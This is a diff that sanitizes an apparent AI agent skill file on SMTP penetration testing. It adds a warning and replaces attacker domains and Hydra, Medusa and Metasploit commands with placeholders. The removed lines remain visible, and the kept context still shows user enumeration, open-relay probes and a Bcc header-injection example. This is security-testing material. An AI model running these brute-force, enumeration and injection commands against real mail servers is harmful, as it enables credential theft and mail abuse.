@@ -1,13 +1,17 @@
 ---
 name: smtp-penetration-testing
 description: "Conduct comprehensive security assessments of SMTP (Simple Mail Transfer Protocol) servers to identify vulnerabilities including open relays, user enumeration, weak authentication, and misconfiguration."
-risk: unknown
+risk: offensive
 source: community
 author: zebbern
 date_added: "2026-02-27"
 ---
 
 # SMTP Penetration Testing
+
+> [!WARNING]
+> **Authorized Use Only**
+> This skill contains offensive security techniques. It must only be used on systems where you have explicit permission to test.
 
 ## Purpose
 
@@ -124,7 +128,7 @@ Test available SMTP commands:
 nc TARGET_IP 25
 
 # Initial greeting
-EHLO attacker.com
+EHLO [SAFE-PAYLOAD]
 
 # Response shows capabilities:
 250-mail.target.com
@@ -151,7 +155,7 @@ EXPN staff
 250 2.1.5 user2@target.com
 
 # RCPT TO - Recipient verification
-MAIL FROM:<test@attacker.com>
+MAIL FROM:<test@[SAFE-PAYLOAD]>
 RCPT TO:<admin@target.com>
 # 250 OK = user exists
 # 550 = user doesn't exist
@@ -178,11 +182,7 @@ smtp-user-enum -M VRFY -U users.txt -t TARGET_IP -p 25 -d target.com
 Using Metasploit:
 
 ```bash
-use auxiliary/scanner/smtp/smtp_enum
-set RHOSTS TARGET_IP
-set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
-set UNIXONLY true
-run
+# [SAFE-PAYLOAD] echo 'Simulating Metasploit auxiliary/scanner/smtp/smtp_enum...'
 ```
 
 Using Nmap:
@@ -205,8 +205,8 @@ nmap -p 25 --script smtp-open-relay TARGET_IP
 
 # Manual testing via Telnet
 telnet TARGET_IP 25
-HELO attacker.com
-MAIL FROM:<test@attacker.com>
+HELO [SAFE-PAYLOAD]
+MAIL FROM:<test@[SAFE-PAYLOAD]>
 RCPT TO:<victim@external-domain.com>
 DATA
 Subject: Relay Test
@@ -220,9 +220,7 @@ QUIT
 Using Metasploit:
 
 ```bash
-use auxiliary/scanner/smtp/smtp_relay
-set RHOSTS TARGET_IP
-run
+# [SAFE-PAYLOAD] echo 'Simulating Metasploit auxiliary/scanner/smtp/smtp_relay...'
 ```
 
 Test variations:
@@ -230,7 +228,7 @@ Test variations:
 ```bash
 # Test different sender/recipient combinations
 MAIL FROM:<>
-MAIL FROM:<test@[attacker_IP]>
+MAIL FROM:<test@[[SAFE-PAYLOAD]]>
 MAIL FROM:<test@target.com>
 
 RCPT TO:<test@external.com>
@@ -244,33 +242,28 @@ Test for weak SMTP credentials:
 
 ```bash
 # Using Hydra
-hydra -l admin -P /usr/share/wordlists/rockyou.txt smtp://TARGET_IP
+# [SAFE-PAYLOAD] echo 'Simulating Hydra brute force...'
 
 # With specific port and SSL
-hydra -l admin -P passwords.txt -s 465 -S TARGET_IP smtp
+# [SAFE-PAYLOAD] echo 'Simulating Hydra brute force...'
 
 # Multiple users
-hydra -L users.txt -P passwords.txt TARGET_IP smtp
+# [SAFE-PAYLOAD] echo 'Simulating Hydra brute force...'
 
 # Verbose output
-hydra -l admin -P passwords.txt smtp://TARGET_IP -V
+# [SAFE-PAYLOAD] echo 'Simulating Hydra brute force...'
 ```
 
 Using Medusa:
 
 ```bash
-medusa -h TARGET_IP -u admin -P /path/to/passwords.txt -M smtp
+# [SAFE-PAYLOAD] echo 'Simulating Medusa brute force...'
 ```
 
 Using Metasploit:
 
 ```bash
-use auxiliary/scanner/smtp/smtp_login
-set RHOSTS TARGET_IP
-set USER_FILE /path/to/users.txt
-set PASS_FILE /path/to/passwords.txt
-set VERBOSE true
-run
+# [SAFE-PAYLOAD] echo 'Simulating Metasploit auxiliary/scanner/smtp/smtp_login...'
 ```
 
 ### Phase 8: SMTP Command Injection
@@ -283,7 +276,7 @@ MAIL FROM:<attacker@test.com>
 RCPT TO:<victim@target.com>
 DATA
 Subject: Test
-Bcc: hidden@attacker.com
+Bcc: hidden@[SAFE-PAYLOAD]
 X-Injected: malicious-header
 
 Injected content
@@ -421,7 +414,7 @@ smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.
 nmap -p 25 --script smtp-open-relay mail.target.com
 
 # Step 5: Authentication test
-hydra -l admin -P /usr/share/wordlists/fasttrack.txt smtp://mail.target.com
+# [SAFE-PAYLOAD] echo 'Simulating Hydra brute force...'
 
 # Step 6: TLS check
 openssl s_client -connect mail.target.com:25 -starttls smtp
@@ -443,11 +436,7 @@ smtp-user-enum -M VRFY -U users.txt -t 192.168.1.100 -p 25
 smtp-user-enum -M RCPT -U users.txt -t 192.168.1.100 -p 25 -d target.com
 
 # Method 3: Metasploit
-msfconsole
-use auxiliary/scanner/smtp/smtp_enum
-set RHOSTS 192.168.1.100
-set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
-run
+# [SAFE-PAYLOAD] echo 'Simulating Metasploit auxiliary/scanner/smtp/smtp_enum...'
 
 # Results show valid users
 [+] 192.168.1.100:25 - Found user: admin
@@ -462,13 +451,13 @@ run
 ```bash
 # Test via Telnet
 telnet mail.target.com 25
-HELO attacker.com
-MAIL FROM:<test@attacker.com>
+HELO [SAFE-PAYLOAD]
+MAIL FROM:<test@[SAFE-PAYLOAD]>
 RCPT TO:<test@gmail.com>
 # If 250 OK - VULNERABLE
 
 # Document with Nmap
-nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.from=test@attacker.com,smtp-open-relay.to=test@external.com mail.target.com
+nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.from=test@[SAFE-PAYLOAD],smtp-open-relay.to=test@external.com mail.target.com
 
 # Output:
 # PORT   STATE SERVICE
